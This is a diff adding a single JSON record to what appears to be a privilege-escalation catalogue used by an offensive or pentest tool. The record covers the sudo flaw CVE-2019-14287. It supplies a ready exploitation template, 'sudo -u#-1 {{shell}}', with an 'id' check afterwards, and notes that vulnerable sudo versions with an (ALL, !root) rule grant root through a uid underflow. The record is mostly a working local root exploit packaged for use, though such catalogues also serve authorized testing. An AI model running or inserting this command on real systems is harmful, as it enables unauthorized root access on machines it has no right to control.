@@ -1,0 +1,1 @@
+{"id":"cve_2019_14287","category":"SUDO_RULE_CVE","binary":"sudo","cve":"CVE-2019-14287","exploitation":["sudo -u#-1 {{shell}}"],"post_exploit":["id"],"notes":"Requires sudo < 1.8.28 with (ALL, !root) sudoers rule. -u#-1 integer underflow maps to uid 0.","source":"cve.mitre.org","tags":["sudo","cve"],"severity":"high"}
